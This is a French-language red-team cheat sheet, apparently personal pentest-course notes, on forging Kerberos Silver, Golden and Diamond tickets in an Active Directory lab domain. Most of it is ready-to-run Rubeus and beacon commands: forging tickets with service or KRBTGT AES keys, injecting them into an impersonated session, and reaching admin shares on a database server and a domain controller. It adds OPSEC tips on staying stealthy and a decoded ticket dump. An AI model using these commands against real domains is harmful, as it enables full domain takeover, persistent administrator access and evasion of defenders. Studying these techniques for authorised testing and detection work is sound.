
- [[#Silver Ticket]]
- [[#Golden Ticket]]
- [[#Diamond Ticket]] (OPSEC)


---
# Silver Ticket


> [!Attention]
> Forger un ticket de service. Le mot de passe du compte d'ordinateur est modifié automatiquement tous les 30 jours par défaut.
> Peut être utile pour avoir une persistence avec un compte admin MSSQL par exemple.
> Pas possible à réaliser si la validation du PAC est activé sur les ordinateurs. (Devrait être activé par défaut depuis le Patch Tuesday d'avril 2025).
> S'assurer de mettre le nom de Domaine en MAJ (peut paraitre plus légitime vis à vis de l'OPSEC).
> Bien préciser les groupes du user à usurper manuellement.


Prérequis :

- Hash du compte de service cible
- Service cible
- Domain
- SID du domaine
- Le SID des groupes du user à usurper


1. Forger le ticket (en local sur notre machine)

##### service CIFS

```
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:<hash_compte_service_cible> /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /groups:<sid_groups> /nowrap
```

##### service MSSQL

Passer le mot de passe en clair du compte de service, puis utiliser le hash pour usurper un utilisateur admin de MSSQL.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /aes256:E4A51DAD46B6D1BA85627EEC82991C8FC94C279CE06140751E02BA015E6A21F9 /user:<user_admin_mssql> /id:<rid_user_admin_mssql> /groups:<rid_group1_user>,<rid_group2_user> /domain:CONTOSO.COM /sid:<sid_domaine> /nowrap
```


2. Usurper l'utilisateur dans une session SYSTEM

```
make_token CONTOSO\Administrator FakePass
```

3. Pass the ticket dans la session

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x
```


4. Vérifier ticket en cache

```
 run klist
```


5. Accès au service distant

```
ls \\lon-db-1\c$
```

6. Purger le ticket

```
run klist purge
```

7. Arrêter impersonation

```
rev2self
```




---
# Golden Ticket


> [!Warning]
> Forger un TGT avec une validité de 10 ans.
> Peu furtif d'un point de vue OPSEC.

Pour performer cette attaque, besoin des éléments suivants:

- The KRBTGT hash for domain (préférer la clé AES au hash NT)
- The SID for the domain
- The name of a target user in the domain
- The FQDN of the domain.

1. Forger le ticket

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

2. Usurper le user dans une session SYSTEM

```
make_token CONTOSO\Administrator FakePass
```

3. Pass The ticket 

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N
```

4. Verifier ticket en cache

```
run klist
```

5. Accéder aux ressources

```
ls \\lon-dc-1\c$
```

6. Purger le ticket

```
run klist purge
```

7. Arrêter impersonation

```
rev2self
```


---
# Diamond Ticket

> [!Tip]
> Consiste à forger un TGT non pas hors ligne mais en ligne, ce qui ne laisse pas de place à l'erreur..
> Meilleure option d'un point de vue OPSEC.

Pour performer cette attaque, besoin des éléments suivants:

- The KRBTGT hash for domain (préférer la clé AES au hash NT)
- The FQDN for the domain
- The name of the target user in the domain
- The SID of the target user in the domain.


1. Depuis le beacon de session en integrité medium, faire une requête de tgt avec l'option tgtdeleg. ()

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:<hash_aes256> /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
```

2. Forger un token pour le compte à usurper dans une session SYSTEM.

```
make_token CONTOSO\Administrator FakePass
```

3. Pass the ticket dans la session

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...snip...]5DT00=
```

4. Vérifier le ticket en cache

```
run klist
```

5. Accéder aux ressources

```
ls \\lon-dc-1\c$
```

6. Purger le ticket

```
run klist purge
```

7. Arrêter impersonation

```
rev2self
```

### Note

En analysant le TGT, on peut s'apercevoir que le FullName correspond à celui du user qui l'a forgé.

```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticket:doIF7[...snip...]kNPTQ==


[*] Action: Describe Ticket

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  05/03/2025 09:36:08
  EndTime                  :  05/03/2025 19:35:40
  RenewTill                :  12/03/2025 09:35:40
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  +3ZP/m5FaNuXrJH6yMFwhFLiTUwBygBhzlQ9qqxB3m8=
  Block One Plain Text     :  6382047530820471
  Decrypted PAC            :
    LogonInfo              :
      LogonTime            : 05/03/2025 09:35:29
      LogoffTime           :
      KickOffTime          :
      PasswordLastSet      : 24/01/2025 14:10:06
      PasswordCanChange    : 25/01/2025 14:10:06
      PasswordMustChange   :
      EffectiveName        : Administrator
      FullName             : Polly Childs
      LogonScript          :
      ProfilePath          :
      HomeDirectory        :
      HomeDirectoryDrive   :
      LogonCount           : 18
      BadPasswordCount     : 0
      UserId               : 500
      PrimaryGroupId       : 513
      GroupCount           : 5
      Groups               : 520,512,513,519,518
      UserFlags            : (32) EXTRA_SIDS
      UserSessionKey       : 0000000000000000
      LogonServer          : LON-DC-1
      LogonDomainName      : CONTOSO
      LogonDomainId        : S-1-5-21-3926355307-1661546229-813047887
      UserAccountControl   : (528) NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
      ExtraSIDCount        : 1
      ExtraSIDs            : S-1-18-1
      ResourceGroupCount   : 0
    ClientName             :
      Client Id            : 05/03/2025 09:35:40
      Client Name          : Administrator
    UpnDns                 :
      DNS Domain Name      : CONTOSO.COM
      UPN                  : Administrator@contoso.com
      Flags                : (2) EXTENDED
      SamName              : Administrator
      Sid                  : S-1-5-21-3926355307-1661546229-813047887-500
    Attributes             :
      AttributeLength      : 2
      AttributeFlags       : (1) PAC_WAS_REQUESTED
    Requestor              :
      RequestorSID         : S-1-5-21-3926355307-1661546229-813047887-500
    ServerChecksum         :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : 91FA516DDD54E76EF88EDC06 (VALID)
    KDCChecksum            :
      Signature Type       : KERB_CHECKSUM_HMAC_SHA1_96_AES256
      Signature            : CFA8C9B8AF6A49175AFE0E1A (VALID)
```